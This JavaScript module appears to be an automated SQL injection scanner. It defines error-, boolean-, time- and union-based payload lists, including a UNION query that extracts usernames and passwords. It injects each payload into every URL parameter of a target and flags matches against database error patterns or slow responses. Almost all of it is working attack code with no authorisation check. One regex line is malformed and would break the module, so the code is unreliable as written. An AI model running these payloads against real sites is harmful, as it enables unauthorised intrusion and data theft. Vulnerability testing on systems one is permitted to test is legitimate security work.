const axios = require('axios');

// SQL Injection payloads by type
const SQLI_PAYLOADS = {
  'error-based': [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" --",
    "' OR 1=1--",
    "admin'--",
    "') OR ('1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1' OR '1' = '1",
    "1' OR '1' = '1' --"
  ],
  'boolean-based': [
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND 1=1--",
    "' AND 1=2--",
    "\" AND \"1\"=\"1",
    "\" AND \"1\"=\"2",
    "' AND 'x'='x",
    "' AND 'x'='y"
  ],
  'time-based': [
    "' AND SLEEP(5)--",
    "' AND SLEEP(5)",
    "\" AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT SLEEP(5)--",
    "1' AND SLEEP(5)#",
    "' AND BENCHMARK(10000000,SHA1('test'))--"
  ],
  'union-based': [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
    "' UNION ALL SELECT NULL--",
    "' UNION SELECT table_name FROM information_schema.tables--"
  ]
};

// Error patterns that indicate SQL injection
const SQL_ERROR_PATTERNS = [
  /SQL syntax.*MySQL/i,
  /Warning.*mysql_/i,
  /valid MySQL result/i,
  /MySqlClient\./i,
  /PostgreSQL.*ERROR/i,
  /Warning.*\Wpg_/i,
  /valid PostgreSQL result/i,
  /Npgsql\./i,
  /Driver.*SQL[\-\_\ ]*Server/i,
  /OLE DB.*SQL Server/i,
  /(\W|\A)SQL Server.*Driver/i,
  /Warning.*mssql_/i,
  /Microsoft SQL Native Client error '[0-9a-fA-F]{8}/i,
  /\[ODBC SQL Server Driver\]/i,
  /\[SQLServer JDBC Driver\]/i,
  /\[SqlException/i,
  /System\.Data\.SqlClient\./i,
  /Oracle.*Driver/i,
  /Warning.*\Woci_/i,
  /Warning.*\Wora_/i,
  /CLI Driver.*DB2/i,
  /DB2 SQL error/i,
  /SQLSTATE/i,
  /\[SQLSTATE/i,
  /SQLSTATE.*SQL/i,
  /SQLite/JDBCDriver/i,
  /SQLite\.Exception/i,
  /SQLiteException/i,
  /System\.SQLite\.SQLiteException/i,
  /Microsoft Access (\d+ )?Driver/i,
  /JET Database Engine/i,
  /Access Database Engine/i,
  /Syntax error.*in query expression/i,
  /Data type mismatch in criteria expression/i,
  /Unclosed quotation mark/i,
  /You have an error in your SQL syntax/i,
  /SQL command not properly ended/i,
  /unexpected end of SQL command/i,
  /unrecognized token/i,
  /SQL error.*POS([0-9]+)/i,
  /SQLSTATE=\w+/i
];

// Test single payload against URL
async function testPayload(url, paramName, payload, method = 'GET', originalValue = '') {
  const startTime = Date.now();
  
  try {
    // Build test URL with payload
    let testUrl = url;
    let config = {
      method: method,
      timeout: 10000,
      validateStatus: () => true // Accept all status codes
    };

    if (method === 'GET') {
      const urlObj = new URL(url);
      urlObj.searchParams.set(paramName, payload);
      testUrl = urlObj.toString();
    } else {
      config.data = { [paramName]: payload };
      config.headers = { 'Content-Type': 'application/x-www-form-urlencoded' };
    }

    const response = await axios(testUrl, config);
    const responseTime = Date.now() - startTime;
    const responseText = response.data.toString();

    // Check for SQL errors
    const hasError = SQL_ERROR_PATTERNS.some(pattern => pattern.test(responseText));
    
    // Check for time-based (if response took > 4 seconds, likely time-based SQLi)
    const isTimeBased = responseTime > 4000;

    return {
      payload,
      vulnerable: hasError || isTimeBased,
      hasError,
      isTimeBased,
      responseTime,
      statusCode: response.status,
      responseLength: responseText.length
    };
  } catch (error) {
    return {
      payload,
      vulnerable: false,
      hasError: false,
      isTimeBased: false,
      responseTime: Date.now() - startTime,
      error: error.message
    };
  }
}

// Extract parameters from URL
function extractParams(url) {
  try {
    const urlObj = new URL(url);
    const params = [];
    
    urlObj.searchParams.forEach((value, key) => {
      params.push({ name: key, value });
    });
    
    return params;
  } catch {
    return [];
  }
}

// Main test function
async function testSQLInjection(url, attackType = 'error-based', method = 'GET') {
  const params = extractParams(url);
  
  if (params.length === 0) {
    throw new Error('No parameters found in URL');
  }

  const payloads = SQLI_PAYLOADS[attackType] || SQLI_PAYLOADS['error-based'];
  const results = [];
  const startTime = Date.now();

  // Test each parameter
  for (const param of params) {
    const paramResults = {
      parameter: param.name,
      originalValue: param.value,
      tests: [],
      vulnerable: false,
      successfulPayloads: []
    };

    // Test each payload
    for (const payload of payloads) {
      const testResult = await testPayload(url, param.name, payload, method, param.value);
      paramResults.tests.push(testResult);
      
      if (testResult.vulnerable) {
        paramResults.vulnerable = true;
        paramResults.successfulPayloads.push({
          payload: testResult.payload,
          type: testResult.isTimeBased ? 'time-based' : 'error-based'
        });
      }
    }

    results.push(paramResults);
  }

  const scanTime = Date.now() - startTime;
  const vulnerableParams = results.filter(r => r.vulnerable);

  return {
    url,
    method,
    attackType,
    totalParams: params.length,
    vulnerableParams: vulnerableParams.length,
    totalTests: results.reduce((sum, r) => sum + r.tests.length, 0),
    scanTime,
    results
  };
}

module.exports = {
  testSQLInjection,
  SQLI_PAYLOADS,
  extractParams
};
